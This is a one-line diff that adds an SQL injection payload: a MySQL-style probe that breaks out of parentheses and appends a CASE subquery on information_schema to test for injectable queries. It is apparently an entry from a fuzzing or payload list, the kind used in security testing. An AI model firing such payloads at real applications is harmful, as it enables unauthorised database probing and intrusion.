@@ -1,0 +1,1 @@
+1)));select (case when (6204=1913) then 6204 else 6204*(select 6204 from information_schema.character_sets) end)#
